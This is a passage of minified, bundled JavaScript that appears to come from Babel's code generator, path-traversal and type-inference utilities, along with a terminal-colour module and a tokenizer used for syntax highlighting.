J=0;J<Q;J++)this._newline()}_catchUp(X,Q){let{format:J}=this;if(!J.preserveFormat){if(J.retainLines&&Q!=null&&Q[X])this.catchUp(Q[X].line);return}let Y=Q==null?void 0:Q[X];if(Y!=null)this._catchUpTo(Y)}_catchUpTo({line:X,column:Q,index:J}){let Y=X-this._buf.getCurrentLine();if(Y>0&&this._noLineTerminator)return;for(let G=0;G<Y;G++)this._newline();let W=Y>0?Q:Q-this._buf.getCurrentColumn();if(W>0){let G=this._originalCode?this._originalCode.slice(J-W,J).replace(/[^\t\x0B\f \xA0\u1680\u2000-\u200A\u202F\u205F\u3000\uFEFF]/gu," "):" ".repeat(W);this._append(G,!1)}}_getIndent(){return this._indentRepeat*this._indent}printTerminatorless(X){this._noLineTerminator=!0,this.print(X)}print(X,Q,J){var Y,W,G;if(!X)return;this._endsWithInnerRaw=!1;let H=X.type,$=this.format,z=$.concise;if(X._compact)$.concise=!0;let U=this[H];if(U===void 0)throw ReferenceError(`unknown node of type ${JSON.stringify(H)} with constructor ${JSON.stringify(X.constructor.name)}`);let K=this._currentNode;if(this._currentNode=X,this.tokenMap)this._printSemicolonBeforeNextToken=this._printSemicolonBeforeNextNode;let B=this._insideAux;this._insideAux=X.loc==null,this._maybeAddAuxComment(this._insideAux&&!B);let q=(Y=X.extra)==null?void 0:Y.parenthesized,Z=q&&$.preserveFormat||q&&$.retainFunctionParens&&H==="FunctionExpression"||N_1(X,K,this.tokenContext,$.preserveFormat?this._boundGetRawIdentifier:void 0);if(!Z&&q&&(W=X.leadingComments)!=null&&W.length&&X.leadingComments[0].type==="CommentBlock")switch(K==null?void 0:K.type){case"ExpressionStatement":case"VariableDeclarator":case"AssignmentExpression":case"ReturnStatement":break;case"CallExpression":case"OptionalCallExpression":case"NewExpression":if(K.callee!==X)break;default:Z=!0}let M=!1;if(!Z&&this._noLineTerminator&&((G=X.leadingComments)!=null&&G.some(NA)||this.format.retainLines&&X.loc&&X.loc.start.line>this._buf.getCurrentLine()))Z=!0,M=!0;let L,R;if(!Z){if(Q||(Q=K&&this._noLineTerminatorAfterNode===K&&wA.isLastChild(K,X)),Q){var j;if((j=X.trailingComments)!=null&&j.some(NA)){if(Z_1(X))Z=!0}else L=this._noLineTerminatorAfterNode,this._noLineTerminatorAfterNode=X}}if(Z){if(this.tokenChar(40),M)this.indent();if(this._endsWithInnerRaw=!1,this.tokenContext&R9.TokenContext.forInOrInitHeadAccumulate)R=this.tokenContext,this.tokenContext=R9.TokenContext.normal;L=this._noLineTerminatorAfterNode,this._noLineTerminatorAfterNode=null}this._lastCommentLine=0,this._printLeadingComments(X,K);let F=H==="Program"||H==="File"?null:X.loc;if(this.exactSource(F,U.bind(this,X,K)),Z){if(this._printTrailingComments(X,K),M)this.dedent(),this.newline();if(this.tokenChar(41),this._noLineTerminator=Q,R)this.tokenContext=R}else if(Q&&!this._noLineTerminator)this._noLineTerminator=!0,this._printTrailingComments(X,K);else this._printTrailingComments(X,K,J);if(this._currentNode=K,$.concise=z,this._insideAux=B,L!==void 0)this._noLineTerminatorAfterNode=L;this._endsWithInnerRaw=!1}_maybeAddAuxComment(X){if(X)this._printAuxBeforeComment();if(!this._insideAux)this._printAuxAfterComment()}_printAuxBeforeComment(){if(this._printAuxAfterOnNextUserNode)return;this._printAuxAfterOnNextUserNode=!0;let X=this.format.auxiliaryCommentBefore;if(X)this._printComment({type:"CommentBlock",value:X},0)}_printAuxAfterComment(){if(!this._printAuxAfterOnNextUserNode)return;this._printAuxAfterOnNextUserNode=!1;let X=this.format.auxiliaryCommentAfter;if(X)this._printComment({type:"CommentBlock",value:X},0)}getPossibleRaw(X){let Q=X.extra;if((Q==null?void 0:Q.raw)!=null&&Q.rawValue!=null&&X.value===Q.rawValue)return Q.raw}printJoin(X,Q,J,Y,W,G,H,$){if(!(X!=null&&X.length))return;if(J==null&&this.format.retainLines){var z;let M=(z=X[0].loc)==null?void 0:z.start.line;if(M!=null&&M!==this._buf.getCurrentLine())J=!0}if(J)this.indent();let U={addNewlines:G,nextNodeStartLine:0},K=Y==null?void 0:Y.bind(this),B=X.length;for(let M=0;M<B;M++){let L=X[M];if(!L)continue;if(Q)this._printNewline(M===0,U);if(this.print(L,void 0,$||0),H==null||H(L,M),K!=null){if(M<B-1)K(M,!1);else if(W)K(M,!0)}if(Q){var q;if(!((q=L.trailingComments)!=null&&q.length))this._lastCommentLine=0;if(M+1===B)this.newline(1);else{var Z;let R=X[M+1];U.nextNodeStartLine=((Z=R.loc)==null?void 0:Z.start.line)||0,this._printNewline(!0,U)}}}if(J)this.dedent()}printAndIndentOnComments(X){let Q=X.leadingComments&&X.leadingComments.length>0;if(Q)this.indent();if(this.print(X),Q)this.dedent()}printBlock(X){let Q=X.body;if(Q.type!=="EmptyStatement")this.space();this.print(Q)}_printTrailingComments(X,Q,J){let{innerComments:Y,trailingComments:W}=X;if(Y!=null&&Y.length)this._printComments(2,Y,X,Q,J);if(W!=null&&W.length)this._printComments(2,W,X,Q,J)}_printLeadingComments(X,Q){let J=X.leadingComments;if(!(J!=null&&J.length))return;this._printComments(0,J,X,Q)}_maybePrintInnerComments(X,Q){if(this._endsWithInnerRaw){var J;this.printInnerComments((J=this.tokenMap)==null?void 0:J.findMatching(this._currentNode,X,Q))}this._endsWithInnerRaw=!0,this._indentInnerComments=!0}printInnerComments(X){let Q=this._currentNode,J=Q.innerComments;if(!(J!=null&&J.length))return;let Y=this.endsWith(32),W=this._indentInnerComments,G=this._printedComments.size;if(W)this.indent();if(this._printComments(1,J,Q,void 0,void 0,X),Y&&G!==this._printedComments.size)this.space();if(W)this.dedent()}noIndentInnerCommentsHere(){this._indentInnerComments=!1}printSequence(X,Q,J,Y){this.printJoin(X,!0,Q!=null?Q:!1,void 0,void 0,Y,void 0,J)}printList(X,Q,J,Y,W,G){this.printJoin(X,J,Y,W!=null?W:w_1,Q,void 0,G)}shouldPrintTrailingComma(X){if(!this.tokenMap)return null;let Q=this.tokenMap.findLastIndex(this._currentNode,(J)=>this.tokenMap.matchesOriginal(J,X));if(Q<=0)return null;return this.tokenMap.matchesOriginal(this._tokens[Q-1],",")}_printNewline(X,Q){let J=this.format;if(J.retainLines||J.compact)return;if(J.concise){this.space();return}if(!X)return;let Y=Q.nextNodeStartLine,W=this._lastCommentLine;if(Y>0&&W>0){let G=Y-W;if(G>=0){this.newline(G||1);return}}if(this._buf.hasContent())this.newline(1)}_shouldPrintComment(X,Q){if(X.ignore)return 0;if(this._printedComments.has(X))return 0;if(this._noLineTerminator&&D_1.test(X.value))return 2;if(Q&&this.tokenMap){let J=this.tokenMap.find(this._currentNode,(Y)=>Y.value===X.value);if(J&&J.start>Q.start)return 2}if(this._printedComments.add(X),!this.format.shouldPrintComment(X.value))return 0;return 1}_printComment(X,Q){let J=this._noLineTerminator,Y=X.type==="CommentBlock",W=Y&&Q!==1&&!this._noLineTerminator;if(W&&this._buf.hasContent()&&Q!==2)this.newline(1);let G=this.getLastChar();if(G!==91&&G!==123&&G!==40)this.space();let H;if(Y){if(H=`/*${X.value}*/`,this.format.indent.adjustMultilineComment){var $;let z=($=X.loc)==null?void 0:$.start.column;if(z){let U=new RegExp("\\n\\s{1,"+z+"}","g");H=H.replace(U,`
`)}if(this.format.concise)H=H.replace(/\n(?!$)/g,`
`);else{let U=this.format.retainLines?0:this._buf.getCurrentColumn();if(this._shouldIndent(47)||this.format.retainLines)U+=this._getIndent();H=H.replace(/\n(?!$)/g,`
${" ".repeat(U)}`)}}}else if(!J)H=`//${X.value}`;else H=`/*${X.value}*/`;if(this._endsWithDiv)this._space();if(this.tokenMap){let{_printSemicolonBeforeNextToken:z,_printSemicolonBeforeNextNode:U}=this;this._printSemicolonBeforeNextToken=-1,this._printSemicolonBeforeNextNode=-1,this.source("start",X.loc),this._append(H,Y),this._printSemicolonBeforeNextNode=U,this._printSemicolonBeforeNextToken=z}else this.source("start",X.loc),this._append(H,Y);if(!Y&&!J)this.newline(1,!0);if(W&&Q!==3)this.newline(1)}_printComments(X,Q,J,Y,W=0,G){let H=J.loc,$=Q.length,z=!!H,U=z?H.start.line:0,K=z?H.end.line:0,B=0,q=0,Z=this._noLineTerminator?function(){}:this.newline.bind(this);for(let M=0;M<$;M++){let L=Q[M],R=this._shouldPrintComment(L,G);if(R===2){z=!1;break}if(z&&L.loc&&R===1){let j=L.loc.start.line,F=L.loc.end.line;if(X===0){let A=0;if(M===0){if(this._buf.hasContent()&&(L.type==="CommentLine"||j!==F))A=q=1}else A=j-B;if(B=F,Z(A),this._printComment(L,1),M+1===$)Z(Math.max(U-B,q)),B=U}else if(X===1){let A=j-(M===0?U:B);if(B=F,Z(A),this._printComment(L,1),M+1===$)Z(Math.min(1,K-B)),B=K}else{let A=j-(M===0?K-W:B);B=F,Z(A),this._printComment(L,1)}}else{if(z=!1,R!==1)continue;if($===1){let j=L.loc?L.loc.start.line===L.loc.end.line:!IA.test(L.value),F=j&&!j_1(J)&&!F_1(Y)&&!O_1(Y)&&!A_1(J);if(X===0)this._printComment(L,F&&J.type!=="ObjectExpression"||j&&M_1(Y,{body:J})?1:0);else if(F&&X===2)this._printComment(L,1);else this._printComment(L,0)}else if(X===1&&!(J.type==="ObjectExpression"&&J.properties.length>1)&&J.type!=="ClassBody"&&J.type!=="TSInterfaceBody")this._printComment(L,M===0?2:M===$-1?3:0);else this._printComment(L,0)}}if(X===2&&z&&B)this._lastCommentLine=B}}Object.assign(xY.prototype,B_1);(0,q_1.addDeprecatedGenerators)(xY);var CG0=CA.default=xY;function w_1(X,Q){if(this.token(",",!1,X),!Q)this.space()}});var xA=m((bA)=>{Object.defineProperty(bA,"__esModule",{value:!0});bA.default=void 0;bA.generate=kA;var EA=GO(),TA=SA();function _A(X,Q,J){if(Q.experimental_preserveFormat){if(typeof X!=="string")throw Error("`experimental_preserveFormat` requires the original `code` to be passed to @babel/generator as a string");if(!Q.retainLines)throw Error("`experimental_preserveFormat` requires `retainLines` to be set to `true`");if(Q.compact&&Q.compact!=="auto")throw Error("`experimental_preserveFormat` is not compatible with the `compact` option");if(Q.minified)throw Error("`experimental_preserveFormat` is not compatible with the `minified` option");if(Q.jsescOption)throw Error("`experimental_preserveFormat` is not compatible with the `jsescOption` option");if(!Array.isArray(J.tokens))throw Error("`experimental_preserveFormat` requires the AST to have attached the token of the input code. Make sure to enable the `tokens: true` parser option.")}let Y={auxiliaryCommentBefore:Q.auxiliaryCommentBefore,auxiliaryCommentAfter:Q.auxiliaryCommentAfter,shouldPrintComment:Q.shouldPrintComment,preserveFormat:Q.experimental_preserveFormat,retainLines:Q.retainLines,retainFunctionParens:Q.retainFunctionParens,comments:Q.comments==null||Q.comments,compact:Q.compact,minified:Q.minified,concise:Q.concise,indent:{adjustMultilineComment:!0,style:"  "},jsescOption:Object.assign({quotes:"double",wrap:!0,minimal:!1},Q.jsescOption),topicToken:Q.topicToken,importAttributesKeyword:Q.importAttributesKeyword};{var W;Y.decoratorsBeforeExport=Q.decoratorsBeforeExport,Y.jsescOption.json=Q.jsonCompatibleStrings,Y.recordAndTupleSyntaxType=(W=Q.recordAndTupleSyntaxType)!=null?W:"hash"}if(Y.minified)Y.compact=!0,Y.shouldPrintComment=Y.shouldPrintComment||(()=>Y.comments);else Y.shouldPrintComment=Y.shouldPrintComment||((z)=>Y.comments||z.includes("@license")||z.includes("@preserve"));if(Y.compact==="auto"){if(Y.compact=typeof X==="string"&&X.length>500000,Y.compact)console.error(`[BABEL] Note: The code generator has deoptimised the styling of ${Q.filename} as it exceeds the max of 500KB.`)}if(Y.compact||Y.preserveFormat)Y.indent.adjustMultilineComment=!1;let{auxiliaryCommentBefore:G,auxiliaryCommentAfter:H,shouldPrintComment:$}=Y;if(G&&!$(G))Y.auxiliaryCommentBefore=void 0;if(H&&!$(H))Y.auxiliaryCommentAfter=void 0;return Y}bA.CodeGenerator=class{constructor(Q,J={},Y){this._ast=void 0,this._format=void 0,this._map=void 0,this._ast=Q,this._format=_A(Y,J,Q),this._map=J.sourceMaps?new EA.default(J,Y):null}generate(){return new TA.default(this._format,this._map).generate(this._ast)}};function kA(X,Q={},J){let Y=_A(J,Q,X),W=Q.sourceMaps?new EA.default(Q,J):null;return new TA.default(Y,W,X.tokens,typeof J==="string"?J:null).generate(X)}var SG0=bA.default=kA});var hA=m((fA)=>{Object.defineProperty(fA,"__esModule",{value:!0});fA.find=E_1;fA.findParent=S_1;fA.getAncestry=v_1;fA.getDeepestCommonAncestorFrom=b_1;fA.getEarliestCommonAncestorFrom=k_1;fA.getFunctionParent=T_1;fA.getStatementParent=__1;fA.inType=h_1;fA.isAncestor=x_1;fA.isDescendant=f_1;var C_1=$0(),{VISITOR_KEYS:P_1}=C_1;function S_1(X){let Q=this;while(Q=Q.parentPath)if(X(Q))return Q;return null}function E_1(X){let Q=this;do if(X(Q))return Q;while(Q=Q.parentPath);return null}function T_1(){return this.findParent((X)=>X.isFunction())}function __1(){let X=this;do if(!X.parentPath||Array.isArray(X.container)&&X.isStatement())break;else X=X.parentPath;while(X);if(X&&(X.isProgram()||X.isFile()))throw Error("File/Program node, we can't possibly find a statement parent to this");return X}function k_1(X){return this.getDeepestCommonAncestorFrom(X,function(Q,J,Y){let W,G=P_1[Q.type];for(let H of Y){let $=H[J+1];if(!W){W=$;continue}if($.listKey&&W.listKey===$.listKey){if($.key<W.key){W=$;continue}}let z=G.indexOf(W.parentKey),U=G.indexOf($.parentKey);if(z>U)W=$}return W})}function b_1(X,Q){if(!X.length)return this;if(X.length===1)return X[0];let J=1/0,Y,W,G=X.map(($)=>{let z=[];do z.unshift($);while(($=$.parentPath)&&$!==this);if(z.length<J)J=z.length;return z}),H=G[0];X:for(let $=0;$<J;$++){let z=H[$];for(let U of G)if(U[$]!==z)break X;Y=$,W=z}if(W)if(Q)return Q(W,Y,G);else return W;else throw Error("Couldn't find intersection")}function v_1(){let X=this,Q=[];do Q.push(X);while(X=X.parentPath);return Q}function x_1(X){return X.isDescendant(this)}function f_1(X){return!!this.findParent((Q)=>Q===X)}function h_1(...X){let Q=this;while(Q){if(X.includes(Q.node.type))return!0;Q=Q.parentPath}return!1}});var Cz=m((mA)=>{Object.defineProperty(mA,"__esModule",{value:!0});mA.createUnionType=t_1;var n_1=$0(),{createFlowUnionType:yA,createTSUnionType:gA,createUnionTypeAnnotation:a_1,isFlowType:o_1,isTSType:s_1}=n_1;function t_1(X){if(X.every((Q)=>o_1(Q))){if(yA)return yA(X);return a_1(X)}else if(X.every((Q)=>s_1(Q))){if(gA)return gA(X)}}});var iA=m((dA)=>{Object.defineProperty(dA,"__esModule",{value:!0});dA.default=Wk1;var Xk1=$0(),cA=Cz(),{BOOLEAN_NUMBER_BINARY_OPERATORS:Qk1,createTypeAnnotationBasedOnTypeof:Jk1,numberTypeAnnotation:lA,voidTypeAnnotation:Yk1}=Xk1;function Wk1(X){if(!this.isReferenced())return;let Q=this.scope.getBinding(X.name);if(Q)if(Q.identifier.typeAnnotation)return Q.identifier.typeAnnotation;else return Gk1(Q,this,X.name);if(X.name==="undefined")return Yk1();else if(X.name==="NaN"||X.name==="Infinity")return lA();else if(X.name==="arguments");}function Gk1(X,Q,J){let Y=[],W=[],G=uA(X,Q,W),H=pA(X,Q,J);if(H){let $=uA(X,H.ifStatement);G=G.filter((z)=>!$.includes(z)),Y.push(H.typeAnnotation)}if(G.length){G.push(...W);for(let $ of G)Y.push($.getTypeAnnotation())}if(!Y.length)return;return(0,cA.createUnionType)(Y)}function uA(X,Q,J){let Y=X.constantViolations.slice();return Y.unshift(X.path),Y.filter((W)=>{W=W.resolve();let G=W._guessExecutionStatusRelativeTo(Q);if(J&&G==="unknown")J.push(W);return G==="before"})}function Hk1(X,Q){let J=Q.node.operator,Y=Q.get("right").resolve(),W=Q.get("left").resolve(),G;if(W.isIdentifier({name:X}))G=Y;else if(Y.isIdentifier({name:X}))G=W;if(G){if(J==="===")return G.getTypeAnnotation();if(Qk1.includes(J))return lA();return}if(J!=="==="&&J!=="==")return;let H,$;if(W.isUnaryExpression({operator:"typeof"}))H=W,$=Y;else if(Y.isUnaryExpression({operator:"typeof"}))H=Y,$=W;if(!H)return;if(!H.get("argument").isIdentifier({name:X}))return;if($=$.resolve(),!$.isLiteral())return;let z=$.node.value;if(typeof z!=="string")return;return Jk1(z)}function $k1(X,Q,J){let Y;while(Y=Q.parentPath){if(Y.isIfStatement()||Y.isConditionalExpression()){if(Q.key==="test")return;return Y}if(Y.isFunction()){if(Y.parentPath.scope.getBinding(J)!==X)return}Q=Y}}function pA(X,Q,J){let Y=$k1(X,Q,J);if(!Y)return;let G=[Y.get("test")],H=[];for(let $=0;$<G.length;$++){let z=G[$];if(z.isLogicalExpression()){if(z.node.operator==="&&")G.push(z.get("left")),G.push(z.get("right"))}else if(z.isBinaryExpression()){let U=Hk1(J,z);if(U)H.push(U)}}if(H.length)return{typeAnnotation:(0,cA.createUnionType)(H),ifStatement:Y};return pA(X,Y,J)}});var XR=m((Ez)=>{Object.defineProperty(Ez,"__esModule",{value:!0});Ez.ArrayExpression=sA;Ez.AssignmentExpression=_k1;Ez.BinaryExpression=Ck1;Ez.BooleanLiteral=xk1;Ez.CallExpression=pk1;Ez.ConditionalExpression=Sk1;Ez.ClassDeclaration=Ez.ClassExpression=Ez.FunctionDeclaration=Ez.ArrowFunctionExpression=Ez.FunctionExpression=gk1;Object.defineProperty(Ez,"Identifier",{enumerable:!0,get:function(){return Kk1.default}});Ez.LogicalExpression=Pk1;Ez.NewExpression=Nk1;Ez.NullLiteral=fk1;Ez.NumericLiteral=vk1;Ez.ObjectExpression=yk1;Ez.ParenthesizedExpression=Tk1;Ez.RegExpLiteral=hk1;Ez.RestElement=tA;Ez.SequenceExpression=Ek1;Ez.StringLiteral=bk1;Ez.TSAsExpression=oA;Ez.TSNonNullExpression=Dk1;Ez.TaggedTemplateExpression=dk1;Ez.TemplateLiteral=wk1;Ez.TypeCastExpression=aA;Ez.UnaryExpression=Ik1;Ez.UpdateExpression=kk1;Ez.VariableDeclarator=Lk1;var Uk1=$0(),Kk1=iA(),nA=Cz(),{BOOLEAN_BINARY_OPERATORS:Vk1,BOOLEAN_UNARY_OPERATORS:Bk1,NUMBER_BINARY_OPERATORS:qk1,NUMBER_UNARY_OPERATORS:Zk1,STRING_UNARY_OPERATORS:Mk1,anyTypeAnnotation:rA,arrayTypeAnnotation:Pz,booleanTypeAnnotation:Sz,buildMatchMemberExpression:fY,genericTypeAnnotation:OX,identifier:W7,nullLiteralTypeAnnotation:jk1,numberTypeAnnotation:Z5,stringTypeAnnotation:G7,tupleTypeAnnotation:Fk1,unionTypeAnnotation:Ok1,voidTypeAnnotation:Ak1,isIdentifier:Rk1}=Uk1;function Lk1(){if(!this.get("id").isIdentifier())return;return this.get("init").getTypeAnnotation()}function aA(X){return X.typeAnnotation}aA.validParent=!0;function oA(X){return X.typeAnnotation}oA.validParent=!0;function Dk1(){return this.get("expression").getTypeAnnotation()}function Nk1(X){if(X.callee.type==="Identifier")return OX(X.callee)}function wk1(){return G7()}function Ik1(X){let Q=X.operator;if(Q==="void")return Ak1();else if(Zk1.includes(Q))return Z5();else if(Mk1.includes(Q))return G7();else if(Bk1.includes(Q))return Sz()}function Ck1(X){let Q=X.operator;if(qk1.includes(Q))return Z5();else if(Vk1.includes(Q))return Sz();else if(Q==="+"){let J=this.get("right"),Y=this.get("left");if(Y.isBaseType("number")&&J.isBaseType("number"))return Z5();else if(Y.isBaseType("string")||J.isBaseType("string"))return G7();return Ok1([G7(),Z5()])}}function Pk1(){let X=[this.get("left").getTypeAnnotation(),this.get("right").getTypeAnnotation()];return(0,nA.createUnionType)(X)}function Sk1(){let X=[this.get("consequent").getTypeAnnotation(),this.get("alternate").getTypeAnnotation()];return(0,nA.createUnionType)(X)}function Ek1(){return this.get("expressions").pop().getTypeAnnotation()}function Tk1(){return this.get("expression").getTypeAnnotation()}function _k1(){return this.get("right").getTypeAnnotation()}function kk1(X){let Q=X.operator;if(Q==="++"||Q==="--")return Z5()}function bk1(){return G7()}function vk1(){return Z5()}function xk1(){return Sz()}function fk1(){return jk1()}function hk1(){return OX(W7("RegExp"))}function yk1(){return OX(W7("Object"))}function sA(){return OX(W7("Array"))}function tA(){return sA()}tA.validParent=!0;function gk1(){return OX(W7("Function"))}var mk1=fY("Array.from"),uk1=fY("Object.keys"),ck1=fY("Object.values"),lk1=fY("Object.entries");function pk1(){let{callee:X}=this.node;if(uk1(X))return Pz(G7());else if(mk1(X)||ck1(X)||Rk1(X,{name:"Array"}))return Pz(rA());else if(lk1(X))return Pz(Fk1([G7(),rA()]));return eA(this.get("callee"))}function dk1(){return eA(this.get("tag"))}function eA(X){if(X=X.resolve(),X.isFunction()){let{node:Q}=X;if(Q.async)if(Q.generator)return OX(W7("AsyncIterator"));else return OX(W7("Promise"));else if(Q.generator)return OX(W7("Iterator"));else if(X.node.returnType)return X.node.returnType}}});var HR=m((GR)=>{Object.defineProperty(GR,"__esModule",{value:!0});GR._getTypeAnnotation=WR;GR.baseTypeStrictlyMatches=yb1;GR.couldBeBaseType=hb1;GR.getTypeAnnotation=xb1;GR.isBaseType=fb1;GR.isGenericType=gb1;var QR=XR(),Fb1=$0(),{anyTypeAnnotation:YR,isAnyTypeAnnotation:hY,isArrayTypeAnnotation:Ob1,isBooleanTypeAnnotation:Ab1,isEmptyTypeAnnotation:Rb1,isFlowBaseAnnotation:Lb1,isGenericTypeAnnotation:Db1,isIdentifier:JR,isMixedTypeAnnotation:Nb1,isNumberTypeAnnotation:wb1,isStringTypeAnnotation:Ib1,isTSArrayType:Cb1,isTSTypeAnnotation:Pb1,isTSTypeReference:Sb1,isTupleTypeAnnotation:Eb1,isTypeAnnotation:Tb1,isUnionTypeAnnotation:_b1,isVoidTypeAnnotation:kb1,stringTypeAnnotation:bb1,voidTypeAnnotation:vb1}=Fb1;function xb1(){let X=this.getData("typeAnnotation");if(X!=null)return X;if(X=WR.call(this)||YR(),Tb1(X)||Pb1(X))X=X.typeAnnotation;return this.setData("typeAnnotation",X),X}var Tz=new WeakSet;function WR(){let X=this.node;if(!X)if(this.key==="init"&&this.parentPath.isVariableDeclarator()){let J=this.parentPath.parentPath,Y=J.parentPath;if(J.key==="left"&&Y.isForInStatement())return bb1();if(J.key==="left"&&Y.isForOfStatement())return YR();return vb1()}else return;if(X.typeAnnotation)return X.typeAnnotation;if(Tz.has(X))return;Tz.add(X);try{var Q;let J=QR[X.type];if(J)return J.call(this,X);if(J=QR[this.parentPath.type],(Q=J)!=null&&Q.validParent)return this.parentPath.getTypeAnnotation()}finally{Tz.delete(X)}}function fb1(X,Q){return _z(X,this.getTypeAnnotation(),Q)}function _z(X,Q,J){if(X==="string")return Ib1(Q);else if(X==="number")return wb1(Q);else if(X==="boolean")return Ab1(Q);else if(X==="any")return hY(Q);else if(X==="mixed")return Nb1(Q);else if(X==="empty")return Rb1(Q);else if(X==="void")return kb1(Q);else if(J)return!1;else throw Error(`Unknown base type ${X}`)}function hb1(X){let Q=this.getTypeAnnotation();if(hY(Q))return!0;if(_b1(Q)){for(let J of Q.types)if(hY(J)||_z(X,J,!0))return!0;return!1}else return _z(X,Q,!0)}function yb1(X){let Q=this.getTypeAnnotation(),J=X.getTypeAnnotation();if(!hY(Q)&&Lb1(Q))return J.type===Q.type;return!1}function gb1(X){let Q=this.getTypeAnnotation();if(X==="Array"){if(Cb1(Q)||Ob1(Q)||Eb1(Q))return!0}return Db1(Q)&&JR(Q.id,{name:X})||Sb1(Q)&&JR(Q.typeName,{name:X})}});var UR=m((mG0,kz)=>{var gY=process||{},$R=gY.argv||[],yY=gY.env||{},ib1=!(!!yY.NO_COLOR||$R.includes("--no-color"))&&(!!yY.FORCE_COLOR||$R.includes("--color")||gY.platform==="win32"||(gY.stdout||{}).isTTY&&yY.TERM!=="dumb"||!!yY.CI),rb1=(X,Q,J=X)=>(Y)=>{let W=""+Y,G=W.indexOf(Q,X.length);return~G?X+nb1(W,Q,J,G)+Q:X+W+Q},nb1=(X,Q,J,Y)=>{let W="",G=0;do W+=X.substring(G,Y)+J,G=Y+Q.length,Y=X.indexOf(Q,G);while(~Y);return W+X.substring(G)},zR=(X=ib1)=>{let Q=X?rb1:()=>String;return{isColorSupported:X,reset:Q("\x1B[0m","\x1B[0m"),bold:Q("\x1B[1m","\x1B[22m","\x1B[22m\x1B[1m"),dim:Q("\x1B[2m","\x1B[22m","\x1B[22m\x1B[2m"),italic:Q("\x1B[3m","\x1B[23m"),underline:Q("\x1B[4m","\x1B[24m"),inverse:Q("\x1B[7m","\x1B[27m"),hidden:Q("\x1B[8m","\x1B[28m"),strikethrough:Q("\x1B[9m","\x1B[29m"),black:Q("\x1B[30m","\x1B[39m"),red:Q("\x1B[31m","\x1B[39m"),green:Q("\x1B[32m","\x1B[39m"),yellow:Q("\x1B[33m","\x1B[39m"),blue:Q("\x1B[34m","\x1B[39m"),magenta:Q("\x1B[35m","\x1B[39m"),cyan:Q("\x1B[36m","\x1B[39m"),white:Q("\x1B[37m","\x1B[39m"),gray:Q("\x1B[90m","\x1B[39m"),bgBlack:Q("\x1B[40m","\x1B[49m"),bgRed:Q("\x1B[41m","\x1B[49m"),bgGreen:Q("\x1B[42m","\x1B[49m"),bgYellow:Q("\x1B[43m","\x1B[49m"),bgBlue:Q("\x1B[44m","\x1B[49m"),bgMagenta:Q("\x1B[45m","\x1B[49m"),bgCyan:Q("\x1B[46m","\x1B[49m"),bgWhite:Q("\x1B[47m","\x1B[49m"),blackBright:Q("\x1B[90m","\x1B[39m"),redBright:Q("\x1B[91m","\x1B[39m"),greenBright:Q("\x1B[92m","\x1B[39m"),yellowBright:Q("\x1B[93m","\x1B[39m"),blueBright:Q("\x1B[94m","\x1B[39m"),magentaBright:Q("\x1B[95m","\x1B[39m"),cyanBright:Q("\x1B[96m","\x1B[39m"),whiteBright:Q("\x1B[97m","\x1B[39m"),bgBlackBright:Q("\x1B[100m","\x1B[49m"),bgRedBright:Q("\x1B[101m","\x1B[49m"),bgGreenBright:Q("\x1B[102m","\x1B[49m"),bgYellowBright:Q("\x1B[103m","\x1B[49m"),bgBlueBright:Q("\x1B[104m","\x1B[49m"),bgMagentaBright:Q("\x1B[105m","\x1B[49m"),bgCyanBright:Q("\x1B[106m","\x1B[49m"),bgWhiteBright:Q("\x1B[107m","\x1B[49m")}};kz.exports=zR();kz.exports.createColors=zR});var VR=m((KR)=>{Object.defineProperty(KR,"__esModule",{value:!0});KR.default=/((['"])(?:(?!\2|\\).|\\(?:\r\n|[\s\S]))*(\2)?|`(?:[^`\\$]|\\[\s\S]|\$(?!\{)|\$\{(?:[^{}]|\{[^}]*\}?)*\}?)*(`)?)|(\/\/.*)|(\/\*(?:[^*]|\*(?!\/))*(\*\/)?)|(\/(?!\*)(?:\[(?:(?![\]\\]).|\\.)*\]|(?![\/\]\\]).|\\.)+\/(?:(?!\s*(?:\b|[\u0080-\uFFFF$\\'"~({]|[+\-!](?!=)|\.?\d))|[gmiyus]{1,6}\b(?![\u0080-\uFFFF$\\]|\s*(?:[+\-*%&|^<>!=?({]|\/(?![\/*])))))|(0[xX][\da-fA-F]+|0[oO][0-7]+|0[bB][01]+|(?:\d*\.\d+|\d+\.?)(?:[eE][+-]?\d+)?)|((?!\d)(?:(?!\s)[$\w\u0080-\uFFFF]|\\u[\da-fA-F]{4}|\\u\{[\da-fA-F]+\})+)|(--|\+\+|&&|\|\||=>|\.{3}|(?:[+\-\/%&|^]|\*{1,2}|<{1,2}|>{1,3}|!=?|={1,2})=?|[?~.,:;[\](){}])|(\s+)|(^$|[\s\S])/g;KR.matchToToken=function(X){var Q={type:"invalid",value:X[0],closed:void 0};if(X[1])Q.type="string",Q.closed=!!(X[3]||X[4]);else if(X[5])Q.type="comment";else if(X[6])Q.type="comment",Q.closed=!!X[7];else if(X[8])Q.type="regex";else if(X[9])Q.type="number";else if(X[10])Q.type="name";else if(X[11])Q.type="punctuator";else if(X[12])Q.type="whitespace";return Q}});var vz=m((LR)=>{Object.defineProperty(LR,"__esModule",{value:!0});var bz=UR(),BR=VR(),qR=h4();function sb1(){return typeof process==="object"&&(process.env.FORCE_COLOR==="0"||process.env.FORCE_COLOR==="false")?!1:bz.isColorSupported}var mY=(X,Q)=>(J)=>X(Q(J));function jR(X){return{keyword:X.cyan,capitalized:X.yellow,jsxIdentifier:X.yellow,punctuator:X.yellow,number:X.magenta,string:X.green,regex:X.magenta,comment:X.gray,invalid:mY(mY(X.white,X.bgRed),X.bold),gutter:X.gray,marker:mY(X.red,X.bold),message:mY(X.red,X.bold),reset:X.reset}}var tb1=jR(bz.createColors(!0)),eb1=jR(bz.createColors(!1));function FR(X){return X?tb1:eb1}var Xv1=new Set(["as","async","from","get","of","set"]),Qv1=/\r\n|[\n\r\u2028\u2029]/,Jv1=/^[()[\]{}]$/,OR;{let X=/^[a-z][\w-]*$/i,Q=function(J,Y,W){if(J.type==="name"){if(qR.isKeyword(J.value)||qR.isStrictReservedWord(J.value,!0)||Xv1.has(J.value))return"keyword";if(X.test(J.value)&&(W[Y-1]==="<"||W.slice(Y-2,Y)==="</"))return"jsxIdentifier";if(J.value[0]!==J.value[0].toLowerCase())return"capitalized"}if(J.type==="punctuator"&&Jv1.test(J.value))return"bracket";if(J.type==="invalid"&&(J.value==="@"||J.value==="#"))return"punctuator";return J.type};OR=function*(J){let Y;while(Y=BR.default.exec(J)){let W=BR.matchToToken(Y);yield{type:Q(W,Y.index,J),value:W.value}}}}function AR(X){if(X==="")return"";let Q=FR(!0),J="";for(let{type:Y,value:W}of OR(X))if(Y in Q)J+=W.split(Qv1).map((G)=>Q[Y](G)).join(`
